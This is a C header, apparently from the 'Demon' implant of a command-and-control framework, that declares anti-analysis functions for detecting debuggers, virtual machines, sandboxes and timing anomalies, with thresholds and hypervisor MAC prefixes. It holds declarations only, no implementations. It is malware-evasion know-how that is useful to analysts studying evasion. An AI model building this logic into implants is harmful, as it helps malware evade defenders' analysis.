#ifndef DEMON_ANTIANALYSIS_H
#define DEMON_ANTIANALYSIS_H

#include <windows.h>

/* Detection type flags */
#define DETECTED_DEBUGGER           0x0001
#define DETECTED_VM_CPUID           0x0002
#define DETECTED_VM_MAC             0x0004
#define DETECTED_VM_REGISTRY        0x0008
#define DETECTED_VM_FILES           0x0010
#define DETECTED_VM_PROCESSES       0x0020
#define DETECTED_SANDBOX_NAME       0x0040
#define DETECTED_SANDBOX_RESOURCES  0x0080
#define DETECTED_TIMING             0x0100
#define DETECTED_PROCESS_COUNT      0x0200

/* Thresholds */
#define MIN_RAM_GB                  4           /* Minimum RAM in GB */
#define MIN_DISK_GB                 64          /* Minimum disk in GB */
#define MIN_CPU_CORES               2           /* Minimum CPU cores */
#define MIN_PROCESS_COUNT           30          /* Minimum running processes */
#define RDTSC_THRESHOLD             1000000     /* RDTSC delta threshold for VM detection */

/* VM MAC address prefixes (first 3 bytes) */
#define MAC_VBOX_1                  0x080027    /* VirtualBox */
#define MAC_VMWARE_1                0x000569    /* VMware */
#define MAC_VMWARE_2                0x000C29    /* VMware */
#define MAC_VMWARE_3                0x001C14    /* VMware */
#define MAC_VMWARE_4                0x005056    /* VMware */
#define MAC_PARALLELS               0x001C42    /* Parallels */
#define MAC_XEN                     0x00163E    /* Xen */

typedef struct _ANTI_ANALYSIS_RESULT {
    BOOL  Detected;
    DWORD DetectionType;    /* Bitmask of what was detected */
} ANTI_ANALYSIS_RESULT, *PANTI_ANALYSIS_RESULT;

/*!
 * @brief
 *  Main anti-analysis check function.
 *  Runs all configured detection checks.
 *
 * @param Result
 *  Optional pointer to receive detailed detection results.
 *
 * @return
 *  TRUE if analysis environment detected, FALSE otherwise.
 */
BOOL AntiAnalysisCheck(
    _Out_opt_ PANTI_ANALYSIS_RESULT Result
);

/*!
 * @brief
 *  Check for attached debuggers using PEB and NtQueryInformationProcess.
 *
 * @return
 *  TRUE if debugger detected, FALSE otherwise.
 */
BOOL AntiAnalysisDebugger(
    VOID
);

/*!
 * @brief
 *  Check for virtual machine using CPUID hypervisor brand string.
 *
 * @return
 *  TRUE if VM detected, FALSE otherwise.
 */
BOOL AntiAnalysisVmCpuid(
    VOID
);

/*!
 * @brief
 *  Check for virtual machine using MAC address prefixes.
 *
 * @return
 *  TRUE if VM detected, FALSE otherwise.
 */
BOOL AntiAnalysisVmMac(
    VOID
);

/*!
 * @brief
 *  Check for sandbox by hostname and username patterns.
 *
 * @return
 *  TRUE if sandbox detected, FALSE otherwise.
 */
BOOL AntiAnalysisSandboxName(
    VOID
);

/*!
 * @brief
 *  Check for sandbox by low system resources (RAM, disk, CPU cores).
 *
 * @return
 *  TRUE if low resources detected, FALSE otherwise.
 */
BOOL AntiAnalysisSandboxResources(
    VOID
);

/*!
 * @brief
 *  Check for sandbox by low process count.
 *
 * @return
 *  TRUE if low process count detected, FALSE otherwise.
 */
BOOL AntiAnalysisProcessCount(
    VOID
);

/*!
 * @brief
 *  Check for VM using RDTSC timing attack.
 *
 * @return
 *  TRUE if timing anomaly detected, FALSE otherwise.
 */
BOOL AntiAnalysisTiming(
    VOID
);

#endif /* DEMON_ANTIANALYSIS_H */
